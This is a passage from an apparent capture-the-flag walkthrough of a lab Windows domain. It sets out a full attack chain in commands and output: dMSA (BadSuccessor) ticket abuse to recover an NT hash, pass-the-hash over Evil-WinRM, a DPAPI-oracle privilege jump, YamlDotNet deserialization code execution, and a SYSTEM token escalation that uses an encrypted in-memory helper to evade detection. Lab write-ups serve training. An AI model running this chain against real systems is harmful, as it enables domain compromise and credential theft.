  get object svc-aegis-deploy \
  --attr 'msDS-SupersededManagedAccountLink,msDS-SupersededServiceAccountState'
```

When the link is `CN=aegis-migrate,OU=Migrations,...` and the state is `2`, reuse it instead of creating another dMSA. Locate the `badS4U2self` executable installed beside BloodyAD, request the existing dMSA ticket again, and replace the failed `badsuccessor.txt` transcript:

```bash
BLOODYAD=$(command -v bloodyAD)
BADS4U2SELF="$(dirname "$(sed -n '1s/^#!//p' "$BLOODYAD")")/badS4U2self"
test -x "$BADS4U2SELF"

(
  cd responses
  proxychains4 -q "$BADS4U2SELF" \
    'kerberos+ccache://odyssey.htb\svc-aegis-build:svc-aegis-build.ccache@172.16.0.10/' \
    'krbtgt/odyssey.htb@odyssey.htb' \
    'aegis-migrate$@odyssey.htb' \
    --dmsa --ccache aegis-migrate-reused.ccache
) | tee responses/badsuccessor.txt
```

The recovered RC4 key is usable as the deploy account's NT hash. The result proves that the migration path worked, but the assessment did not record DC build and patch state, so it should not be used alone to claim a specific missing patch.

Extract and validate the key:

```bash
export DEPLOY_NT_HASH
DEPLOY_NT_HASH=$(
  awk '
    /dMSA previous keys found/ {found=1; next}
    found && /^RC4: [0-9a-fA-F]{32}$/ {print $2; exit}
  ' responses/badsuccessor.txt
)
test "${#DEPLOY_NT_HASH}" -eq 32

./scripts/domain-deploy.sh smb 172.16.0.10
./scripts/domain-deploy.sh ldap 172.16.0.10
./scripts/domain-deploy.sh winrm 172.16.0.10
```

WinRM accepted `ODYSSEY\svc-aegis-deploy`. NetExec's `Pwn3d!` label did not prove that this account was a local administrator. Its useful memberships were `Remote Management Users` and `AegisStream-Viewers`; the application-specific viewer role supplied the next lead.

## 10. AegisStream: viewer to operator

### 10.1 Finding the viewer boundary

Because the deploy account belonged to `AegisStream-Viewers`, the product directory and ACLs were enumerated instead of assuming generic Windows administrator rights:

```bash
./scripts/domain-deploy.sh winrm 172.16.0.10 -x \
  'cmd.exe /c "echo FILES & dir /a /s C:\ProgramData\AegisStream & echo ACLS & icacls C:\ProgramData\AegisStream /t /c"'
```

```text
C:\ProgramData\AegisStream\keys\viewer.key               Viewers:(R)
C:\ProgramData\AegisStream\keys\operator.key.enc        Viewers:(RX)
C:\ProgramData\AegisStream\dpapi\operator.wrap.bin      Viewers:(RX)
C:\Program Files\Aegis Stream Collector\AegisStreamSvc.dll
C:\Program Files\Aegis Stream Collector\YamlDotNet.dll
```

Connect interactively from the `Odyssey` directory so Evil-WinRM's relative local paths resolve correctly:

```bash
proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
```

The following are Evil-WinRM client commands, not standalone PowerShell commands. Enter one code block at a time at the `*Evil-WinRM*` prompt and wait for it to finish before entering the next. Pasting multiple `download` lines together can send them to PowerShell as one submission, where `download` is not recognized.

```text
Set-Location C:\Users\svc-aegis-deploy\Documents
```

```text
download 'C:\ProgramData\AegisStream\keys\viewer.key' 'artifacts/aegisstream/viewer.key'
```

```text
download 'C:\ProgramData\AegisStream\keys\operator.key.enc' 'artifacts/aegisstream/operator.key.enc'
```

```text
download 'C:\ProgramData\AegisStream\dpapi\operator.wrap.bin' 'artifacts/aegisstream/operator.wrap.bin'
```

```text
download 'C:\Program Files\Aegis Stream Collector\AegisStream.Common.dll' 'artifacts/aegisstream/AegisStream.Common.dll'
```

```text
download 'C:\Program Files\Aegis Stream Collector\AegisStreamSvc.dll' 'artifacts/aegisstream/AegisStreamSvc.dll'
```

```text
download 'C:\Program Files\Aegis Stream Collector\YamlDotNet.dll' 'artifacts/aegisstream/YamlDotNet.dll'
```

Decompile the downloaded assemblies locally. `TERM=dumb` is scoped to ILSpyCmd because the .NET 6 console library used by this pinned release cannot parse Kali's current, extended `xterm` terminfo entry. Do not substitute `TERM=xterm`; it raises `The terminfo database is invalid` in an interactive terminal. `--disable-updatecheck` suppresses the non-fatal newer-version notice and does not affect decompilation:

```bash
export PATH="$PATH:/root/.dotnet/tools"
command -v ilspycmd

TERM=dumb ilspycmd --disable-updatecheck \
  -p -o /tmp/odyssey-ilspy/common \
  artifacts/aegisstream/AegisStream.Common.dll

TERM=dumb ilspycmd --disable-updatecheck \
  -p -o /tmp/odyssey-ilspy/svc \
  artifacts/aegisstream/AegisStreamSvc.dll

test -s /tmp/odyssey-ilspy/common/AegisStream.Common/HmacUtil.cs
test -s /tmp/odyssey-ilspy/svc/AegisStreamSvc/StreamService.cs
printf 'Decompilation complete: %s files\n' \
  "$(find /tmp/odyssey-ilspy -type f | wc -l)"
```

Expected confirmation for these two assemblies:

```text
Decompilation complete: 17 files
```

### 10.2 Crossing from viewer to operator

The service authenticates each named-pipe request with HMAC-SHA256 over:

```text
UTF8(opcode) || payload
```

The readable `viewer.key` can therefore sign viewer-authorized operations. One such operation, `DIAG_DECRYPT_TELEMETRY_BLOB`, passes an attacker-supplied payload to DPAPI in the service account's context:

```csharp
byte[] body = ProtectedData.Unprotect(
    frame.Payload,
    null,
    DataProtectionScope.CurrentUser
);
```

The same service loads its operator credential by DPAPI-unprotecting `operator.wrap.bin`, then using the returned 32-byte AES key to decrypt `operator.key.enc`. Supplying that wrapper to the viewer diagnostic makes the service perform the privileged DPAPI operation for a viewer.

Compile the included named-pipe client locally:

```bash
TERM=dumb mcs -optimize+ \
  -out:artifacts/AegisStreamClient.exe \
  artifacts/AegisStreamClient.cs
```

Use a second Kali terminal for the local compilation, or reconnect after it finishes:

```bash
proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
```

At the Evil-WinRM prompt, upload the client and request decryption with the viewer key. Enter the two commands separately:

```text
upload artifacts/AegisStreamClient.exe AegisStreamClient.exe
```

```text
.\AegisStreamClient.exe request 'C:\ProgramData\AegisStream\keys\viewer.key' DIAG_DECRYPT_TELEMETRY_BLOB 'C:\ProgramData\AegisStream\dpapi\operator.wrap.bin' '.\operator.wrap.key'
```

```text
status=OK bytes=32
```

Download the 32-byte result before leaving Evil-WinRM:

```text
download '.\operator.wrap.key' 'artifacts/aegisstream/operator.wrap.key'
```

The encrypted operator blob is laid out as a 12-byte nonce, 16-byte authentication tag, and ciphertext. Decrypt it locally with the returned wrapping key:

```bash
./scripts/decrypt-aegis-operator.py \
  artifacts/aegisstream/operator.wrap.key \
  artifacts/aegisstream/operator.key.enc \
  artifacts/aegisstream/operator.key
```

```text
decrypted operator key: 32 bytes
```

Use a second Kali terminal for the local decryption, or reconnect afterward with the same one-line Evil-WinRM command:

```bash
proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
```

Upload the recovered operator HMAC key and verify it with a harmless export. Enter the commands separately:

```text
upload artifacts/aegisstream/operator.key operator.key
```

```text
.\AegisStreamClient.exe request '.\operator.key' CONFIG_EXPORT - '.\config-export.yml'
```

```text
status=OK bytes=125
```

The successful export proves that requests signed with the recovered key pass operator authorization.

## 11. AegisStream YAML execution and SYSTEM

### 11.1 Unsafe import as `svc-aegis-stream`

Decompilation of the operator-only `CONFIG_IMPORT` path showed a YamlDotNet deserializer that resolves types from input tags and deserializes into `object`:

```csharp
new DeserializerBuilder()
    .WithNodeTypeResolver(new TypeNameInTagNodeTypeResolver())
    .Build()
    .Deserialize<object>(new StringReader(input));
```

That combination lets YAML instantiate arbitrary available .NET types. The included `proof.yml` uses `System.Windows.Data.ObjectDataProvider` to call `Process.Start` during deserialization.

In Evil-WinRM:

```text
upload artifacts/aegisstream/proof.yml proof.yml
```

```text
.\AegisStreamClient.exe request '.\operator.key' CONFIG_IMPORT '.\proof.yml' '.\proof-response.bin'
```

```text
cmd /c type C:\ProgramData\AegisStream\logs\yaml-proof.txt
```

```text
status=OK bytes=0
odyssey\svc-aegis-stream
```

The execution identity is the AegisStream service account, not the deploy user. Use the included enumeration job to inspect its token:

```text
upload artifacts/aegisstream/stream-enum.yml stream-enum.yml
```

```text
.\AegisStreamClient.exe request '.\operator.key' CONFIG_IMPORT '.\stream-enum.yml' '.\stream-enum-response.bin'
```

```text
cmd /c type C:\ProgramData\AegisStream\logs\stream-token.txt
```

```text
User Name: odyssey\svc-aegis-stream
Mandatory Label\High Mandatory Level
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

### 11.2 Token transition and `root.txt`

The final transition reuses the pinned token helper built during the SQL stage. `StreamRunner.cs` decrypts `AuditWorker.enc` in memory and invokes its managed entry point, avoiding a plaintext helper executable in the service's working directory.

Build the runner and encrypt the already-generated helper with the matching key and IV embedded in `StreamRunner.cs`:

```bash
TERM=dumb mcs -optimize+ \
  -out:artifacts/StreamRunner.exe \
  artifacts/StreamRunner.cs

openssl enc -aes-256-cbc \
  -K 319a77c205648dee4b13992a7f40bd18d1560cab8329f4687235e09d14ca5bf1 \
  -iv 6d28a104bb739e510fc83692e7451adc \
  -in artifacts/AuditWorker.exe \
  -out artifacts/AuditWorker.enc
```

Use a second Kali terminal for the local build, or reconnect afterward:

```bash
proxychains4 -q evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H "$DEPLOY_NT_HASH"
```

At the Evil-WinRM prompt, enter each upload separately. Keep this session open after the uploads; the following `icacls` and import commands are Windows commands and must also run at the `*Evil-WinRM*` prompt, not in Kali.

```text
upload artifacts/StreamRunner.exe StreamRunner.exe
```

```text
upload artifacts/AuditWorker.enc AuditWorker.enc
```

```text
upload artifacts/aegisstream/system-debug.yml system-debug.yml
```

```text
upload artifacts/aegisstream/root-action.yml root-action.yml
```

The files are staged in the deploy user's Documents directory, so explicitly grant the stream service only the access it needs:

```text
cmd.exe /c icacls C:\Users\svc-aegis-deploy\Documents\StreamRunner.exe /grant "ODYSSEY\svc-aegis-stream:RX"
```

```text
cmd.exe /c icacls C:\Users\svc-aegis-deploy\Documents\AuditWorker.enc /grant "ODYSSEY\svc-aegis-stream:R"
```

Run the identity job first:

```text
.\AegisStreamClient.exe request .\operator.key CONFIG_IMPORT .\system-debug.yml .\system-debug-response.bin
```

```text
cmd.exe /c type C:\ProgramData\AegisStream\logs\system-debug.txt
```

```text
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] PID : 1000 Token:0x780 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 7064
```

As on the SQL host, `NETWORK SERVICE` is the intermediate RPC/named-pipe identity in the token helper's trace. The later lines establish that a SYSTEM token was found and used to create a child process.

The final job uses that SYSTEM child to read the Administrator desktop and write the result to the viewer-readable AegisStream log directory:

```text
.\AegisStreamClient.exe request .\operator.key CONFIG_IMPORT .\root-action.yml .\root-action-response.bin
```

Read the result through the existing WinRM access:

```bash
./scripts/domain-deploy.sh winrm 172.16.0.10 -x \
  'cmd.exe /c type C:\ProgramData\AegisStream\logs\root-candidate.txt'
```
